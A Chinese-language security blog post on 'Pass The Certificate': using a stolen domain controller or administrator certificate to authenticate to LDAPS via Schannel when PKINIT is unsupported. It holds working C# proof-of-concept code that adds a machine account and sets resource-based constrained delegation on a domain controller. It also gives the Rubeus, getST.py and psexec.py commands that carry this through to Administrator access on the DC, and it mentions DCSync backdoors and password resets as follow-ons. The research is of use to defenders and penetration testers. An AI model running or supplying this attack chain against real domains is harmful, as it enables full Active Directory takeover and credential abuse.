---
title: Pass The Certificate when PKINIT Padata Type is NOSUPP
date: 2023-02-28 01:53:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Active Directory", "LDAPS", "Schannel", "RBCD"]
layout: post
---

前段时间，我尝试为某域环境中的域控制器添加 `msDS-KeyCredentialLink` 属性来执行 Shadow Credentials，但在最后一步遇到了 PKINIT 不起作用的情况。最终，我成功使用证书通过 Schannel 对 LDAP/S 服务器进行身份验证，并执行基于资源的约束性委派攻击。



## Background

前段时间，我尝试为某域环境中的域控制器添加 `msDS-KeyCredentialLink` 属性来执行 Shadow Credentials，但在最后一步遇到了 PKINIT 不起作用的情况。

通常，在 Active Directory 环境中部署 PKI 时，会默认支持 PKINIT。然而，在我测试过程中，使用域控制器证书为域控制器申请 TGT 票据时遇到了以下错误消息：

```console
C:\Users\Marcus\Desktop>Rubeus.exe asktgt /user:DC02$ /certificate:<Base64Certificate> /password:"P0eOh6YOpgYw99mx" /domain:pentest.com /dc:DC01.pentest.com /getcredentials /show /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=DC01$
[*] Building AS-REQ (w/ PKINIT preauth) for: 'pentest.com\DC01$'
[*] Using domain controller: 172.26.10.11:88

[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP


C:\Users\Marcus\Desktop>
```

根据 Microsoft 官方文档 “[*4771(F): Kerberos pre-authentication failed*](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771)” 的描述，该报错显示 KDC 不支持 PADATA 类型（预认证数据）, Kerberos 预身份验证失败。

> *This event generates every time the Key Distribution Center fails to issue a Kerberos Ticket Granting Ticket (TGT). This problem can occur when a domain controller doesn't have a certificate installed for smart card authentication (for example, with a "Domain Controller" or "Domain Controller Authentication" template), the user's password has expired, or the wrong password was provided.*

每次密钥分发中心未能发出 Kerberos 票证授予票证（TGT）时，都会生成此事件。当域控制器没有安装用于智能卡身份验证的证书（例如，使用 “域控制器” 或 “域控制器身份验证” 模板）、用户密码已过期或提供了错误的密码时，可能会出现此问题。

遇到这种情况，则无法使用得到的证书来获取 TGT 或 NTLM 哈希。那么，我们还可以用证书做些什么呢？

## Turn to Secure Channel（Schannel）

回顾 Lee Christensen（[@tifkin_](https://twitter.com/tifkin_)）和 Will Schroeder（[@harmj0y](https://twitter.com/harmj0y)）发布的 [*Certified Pre-Owned - Abusing Active Directory Certificate Services*](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) 白皮书，里面曾介绍到 AD 默认支持两种协议的证书身份验证：Kerberos 协议和安全信道（Secure Channel，Schannel）。对于 Kerberos 协议，技术规范 “[MS-PKCA]: Public Key Cryptography for Initial  Authentication (PKINIT) in Kerberos Protocol” 中定义了身份验证过程。由于 PKINIT 会引起 KDC 报错，因此我们可以将思路转向第二种协议——安全信道（Secure Channel，Schannel）。

Secure Channel（Schannel）是 Windows 在建立 TLS/SSL 连接时利用的 SSP。Schannel 支持客户端身份验证（以及许多其他功能），使远程服务器能够验证连接用户的身份。它使用 PKI 完成此操作，证书是主要凭据。在 TLS 握手期间，服务器要求客户端请提供证书以进行身份验证。客户端先前已从服务器信任的 CA 颁发客户端身份验证证书，然后将其证书发送到服务器。然后，服务器验证证书是否正确，并在一切正常的情况下授予用户访问权限。Comodo 在他们的博客文章 [*What is SSL/TLS Client Authentication? How does it work?*](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html) 上对这个过程进行了简单的概述。

当帐户使用证书向 AD 进行身份验证时，DC 需要以某种方式将证书凭据映射到 AD 帐户。Schannel 首先尝试使用 Kerberos 的扩展协议 S4U2Self 将凭据映射到用户帐户。如果不成功，它将尝试使用证书的 SAN 扩展、主题和颁发者字段的组合或仅从颁发者将证书映射到用户帐户。

默认情况下，AD 环境中没有多少协议支持通过 Schannel 开箱即用的 AD 身份验证。WinRM、RDP 和 IIS 都支持使用 Schannel 的客户端身份验证，但它需要额外的配置，并且在某些情况下（如 WinRM）不与 Active Directory 集成。令一种通常有效的协议是 LDAPS（又名 LDAP over SSL/TLS）。事实上，从 AD 技术规范（MS-ADTS）中了解到，甚至可以直接对 LDAPS 进行客户端证书身份验证。

这意味着我们最开始为域控申请到的证书可以有用武之地，能够向 LDAP 服务进行身份验证。与 Pass The Hash 类似，我们可以将这一过程命名为 Pass The Certificate。

## Pass The Certificate

为了验证我们的利用思路，我通过 C# 创建创建了一个名为 [PassTheCertificate](https://gist.github.com/wh0amitz/8d619ee2004d323bf9d4ec3c66751a4e) 的概念性 POC。该 POC 执行后，会通过提供的证书认证到 LDAPS，创建一个新的机器账户，并为指定的机器账户设置 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性，以执行基于资源的约束委派（RBCD）攻击。

### Main Function

如下编写入口函数，用于获取命令行参数，并初始化 AllowedToAct 类执行攻击过程。

```c#
static void Main(string[] args)
{
    string Domain = null;
    string Server = null;
    int    PortNumber = 636;
    string CertPath = null;
    string CertPassword = null;
    string MachineAccount = null;
    string MachinePassword = null;
    string TargetMachineDN = null;

    for (int i = 0; i < args.Length; i++)
    {
        switch (args[i])
        {
            case "-Domain":
                Domain = args[i + 1];
                break;
            case "-Server":
                Server = args[i + 1];
                break;
            case "-PortNumber":
                PortNumber = Convert.ToInt32(args[i + 1]);
                break;
            case "-CertPath":
                CertPath = args[i + 1];
                break;
            case "-CertPassword":
                CertPassword = args[i + 1];
                break;
            case "-Target":
                TargetMachineDN = args[i + 1].TrimEnd('$');
                break;
            case "-MachineAccount":
                MachineAccount = args[i + 1].TrimEnd('$');
                break;
            case "-MachinePassword":
                MachinePassword = args[i + 1];
                break;
        }
    }
    
    AllowedToAct allowedToAct = new AllowedToAct(Domain, Server, PortNumber, CertPath, CertPassword, MachineAccount, MachinePassword, TargetMachineDN);
    allowedToAct.Exploit();
}
```

### Establish a Connection to LDAPS

根据 Microsoft 有关 AD 技术规范（MS-ADTS）的官方文档 “*[5.1.1.2 Using SSL/TLS](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/8e73932f-70cf-46d6-88b1-8d9f86235e81)*”，Active Directory 允许通过两种方式建立到 DC 的受 SSL/TLS 保护的连接：

> *Active Directory permits two means of establishing an SSL/TLS-protected connection to a DC. The first is by connecting to a DC on a protected LDAPS port (TCP ports 636 and 3269 in AD DS, and a configuration-specific port in AD LDS). The second is by connecting to a DC on a regular LDAP port (TCP ports 389 or 3268 in AD DS, and a configuration-specific port in AD LDS), and later sending an LDAP_SERVER_START_TLS_OID extended operation [RFC2830]. In both cases, the DC will request (but not require) the client's certificate as part of the SSL/TLS handshake [RFC2246]. If the client presents a valid certificate to the DC at that time, it can be used by the DC to authenticate (bind) the connection as the credentials represented by the certificate.*

- 第一种是通过受保护的 LDAPS 端口（AD DS 中的 TCP 端口 636 和 3269，以及 AD LDS 中的配置特定端口）连接到 DC。
- 第二种是通过常规 LDAP 端口（AD DS 中的 TCP 端口 389 或 3268，以及 AD LDS 中的特定配置端口）连接到 DC，然后发送 LDAP_SERVER_START_TLS_OID 扩展操作。

在这两种情况下，DC 都会请求（但不要求）客户端的证书作为 SSL/TLS 握手的一部分。如果客户端当时向 DC 出示有效证书，DC 可以使用它来验证（绑定）连接，作为证书所代表的凭据。

Windows .NET API 提供的 `System.DirectoryServices.Protocols.LdapConnection` 类支持通过 LDAP 会话选项 `SecureSocketLayer` 来启用连接上的安全套接字层（SSL），并可以通过 `ClientCertificates` 属性获取一个或多个要发送用于身份验证的客户端证书。

我们通过 `System.Security.Cryptography.X509Certificates.X509Certificate2` 类来导入 X.509 证书存储，并将导入的证书添加到 `LdapConnection` 的 `ClientCertificates` 属性作为连接 LDAPS 的凭据，最终与 LDAPS 建立受 SSL/TLS 保护的连接，如下所示。

```c#
public bool VerifyServerCertificateCallback(LdapConnection connection, X509Certificate certificate)
{
    return true;
}
public void ActiveDirectoryConnection(string Server, int PortNumber)
{
    LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(Server, PortNumber);
    LdapConnection connection = new LdapConnection(identifier);
            
    if (!String.IsNullOrEmpty(this.CertPath) && !String.IsNullOrEmpty(this.CertPassword))
    {
        X509Certificate2 certificate = new X509Certificate2(this.CertPath, this.CertPassword, X509KeyStorageFlags.Exportable);
        connection.ClientCertificates.Add(certificate);
        connection.SessionOptions.VerifyServerCertificate = VerifyServerCertificateCallback;
        connection.SessionOptions.SecureSocketLayer = true;
    }
            
    if (connection != null)
    {
        this.connection = connection;
        Console.WriteLine("[*] Established connection to Active Directory.");
        // # 1.3.6.1.4.1.4203.1.11.3 = OID for LDAP_SERVER_WHO_AM_I_OID (see MS-ADTS 3.1.1.3.4.2 LDAP Extended Operations)
        // https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/faf0b8c6-8c59-439f-ac62-dc4c078ed715
        ExtendedRequest extendedRequest = new ExtendedRequest("1.3.6.1.4.1.4203.1.11.3");
        try
        {
            ExtendedResponse extendedResponse = (ExtendedResponse)this.connection.SendRequest(extendedRequest);
            Console.Write("[*] Operating LDAP As : ");
            Console.WriteLine(Encoding.UTF8.GetString(extendedResponse.ResponseValue, 0, extendedResponse.ResponseValue.Length));
        }
        catch (DirectoryOperationException e)
        {
            Console.WriteLine(e.ToString());
        }
    }
}
```

连接建立后，会向 LDAP 发送 `LDAP_SERVER_WHO_AM_I_OID` 扩展操作，用于获取当前连接的用户帐户名。

### Add New Machine Account

与 LDAP 服务建立连接后，通过 `AddRequest` 向活动目录发送一个请求，在 `CN=Computers` 目录下创建一个新的计算机对象，同时设置它的 `DnsHostName`、`SamAccountName`、`userAccountControl`、`unicodePwd`、`objectClass` 以及 `ServicePrincipalName` 等属性。最后通过 `SearchRequest` 发送一个查询请求，获取新添加的计算机对象的 SID 并返回。

```c#
public SecurityIdentifier AddComputer(string DomainName, string DistinguishedName, string MachineAccount, string MachinePassword)
{
    SecurityIdentifier securityIdentifier = null;
    // Adds an entry to the CN=Computers directory
    AddRequest addRequest = new AddRequest(DistinguishedName, new DirectoryAttribute[] {
        new DirectoryAttribute("DnsHostName", MachineAccount + "." + DomainName),
        new DirectoryAttribute("SamAccountName", MachineAccount + "$"),
        new DirectoryAttribute("userAccountControl", "4096"),
        new DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes("\"" + MachinePassword + "\"")),
        new DirectoryAttribute("objectClass", "Computer"),
        new DirectoryAttribute("ServicePrincipalName", "HOST/" + MachineAccount + "." + DomainName, "RestrictedKrbHost/" + MachineAccount + "." + DomainName, "HOST/" + MachineAccount, "RestrictedKrbHost/" + MachineAccount)
    });

    try
    {
        this.connection.SendRequest(addRequest);
        Console.WriteLine($"[*] Machine account {MachineAccount}$ added.");
    }
    catch (Exception ex)
    {
        Console.WriteLine("[-] The new machine could not be created! User may have reached ms-DS-MachineAccountQuota limit.");
    }

    // Get SID of the new computer object
    SearchResultEntryCollection Entries = GetSearchResultEntries(DistinguishedName, "(&(samAccountType=805306369)(|(name=" + MachineAccount + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
    foreach (SearchResultEntry entry in Entries)
    {
        try
        {
            securityIdentifier = new SecurityIdentifier(entry.Attributes["objectSid"][0] as byte[], 0);
            Console.WriteLine($"[*] Sid of the new machine account: {securityIdentifier.Value}.");
        }
        catch
        {
            Console.WriteLine("[-] Can not retrieve the sid.");
        }
    }
    return securityIdentifier;
}
```

### Set the RBCD of The Target Machine Account

最后，通过 `ModifyRequest` 将新机器账户的 SID 添加到目标机器账户的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性中，以设置从新机器帐户到目标帐户的基于资源的约束性委派（RBCD）。

```c#
public void Exploit()
{
    string NewMachineDN = $"CN={this.MachineAccount},CN=Computers," + this.RootDN;
                        
    SecurityIdentifier securityIdentifier = AddComputer(this.Domain, NewMachineDN, this.MachineAccount, this.MachinePassword);
    string nTSecurityDescriptor = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + securityIdentifier + ")";
    RawSecurityDescriptor rawSecurityIdentifier = new RawSecurityDescriptor(nTSecurityDescriptor);
    byte[] DescriptorBuffer = new byte[rawSecurityIdentifier.BinaryLength];
    rawSecurityIdentifier.GetBinaryForm(DescriptorBuffer, 0);

    ModifyRequest modifyRequest = new ModifyRequest(this.TargetMachineDN, DirectoryAttributeOperation.Replace, "msDS-AllowedToActOnBehalfOfOtherIdentity", DescriptorBuffer);
    try
    {
        ModifyResponse modifyResponse = (ModifyResponse) this.connection.SendRequest(modifyRequest);
        Console.WriteLine($"[*] {this.MachineAccount}$ can now impersonate users on {this.TargetMachineDN} via S4U2Proxy.");
    }
    catch
    {
        Console.WriteLine("[-] Could not modify attribute msDS-AllowedToActOnBehalfOfOtherIdentity, check that your user has sufficient rights.");
    }
}
```

你可以在这里找到我完整的 POC 代码：[PassTheCertificate.cs](https://gist.github.com/wh0amitz/8d619ee2004d323bf9d4ec3c66751a4e)

## Let’s see it in action

通过 [Shadow Credentials](https://whoamianony.top/posts/shadow-credentials/) 或其他证书窃取的方法（[THEFT1](https://whoamianony.top/posts/attack-surface-mining-for-ad-cs/#041-exporting-certificates-using-the-crypto-apis--theft1)、[THEFT3](https://whoamianony.top/posts/attack-surface-mining-for-ad-cs/#043-machine-certificate-theft-via-dpapi--theft3) 或 [THEFT4](https://whoamianony.top/posts/attack-surface-mining-for-ad-cs/#044-finding-certificate-files--theft4)）获得域控制器或域管理员等高权限帐户的证书（.pfx），然后执行以下命令，通过证书认证到 LDAPS，添加一个名为 “PENTEST” ，密码为 “Passw0rd” 的机器账户，并设置 PENTEST 到域控制器 DC01 的 RBCD。

```console
C:\Users\Marcus\Desktop> PassTheCertificate.exe -CertPath .\Administrator.pfx -CertPassword 123456 -MachineAccount PENTEST$ -MachinePassword Passw0rd -Target "CN=DC01,OU=Domain Controllers,DC=pentest,DC=com"
```

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20230228013127977.png)

此时，我们可以通过 Impacket 套件中的 getST.py 执行基于资源的约束性委派攻击，并获取用于访问 DC01 机器上 CIFS 服务的高权限票据，如图下所示。

```bash
python3 getST.py pentest.com/PENTEST\$:Passw0rd -spn CIFS/DC01.pentest.com -impersonate Administrator -dc-ip 172.26.10.11
```

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20230228013417793.png)

最后，通过设置环境变量 `KRB5CCNAME` 来使用该票据，并通过 psexec.py 获取域控制器的最高权限，如下图所示。

```bash
export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k pentest.com/Administrator@dc01.pentest.com -no-pass
```

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20230228013643492.png)

## Ending......

不仅是修改 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性，由于我们是通过高权限帐户的证书认证到 LDAP 服务，因此可以执行任何类似的操作，例如活动目录查询、修改对象的属性、修改 AD 对象的 DACL、设置 DCSync 后门以及重置用户的密码等。

其实，早在去年中旬，[@AlmondOffSec](https://twitter.com/AlmondOffSec) 便发布过一个名为 [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) 的概念性工具，允许攻击者使用证书通过 Schannel 对 LDAP/S 服务器进行身份验证。并且，他们的研究同样始于 KDC_ERR_PADATA_TYPE_NOSUPP 报错。
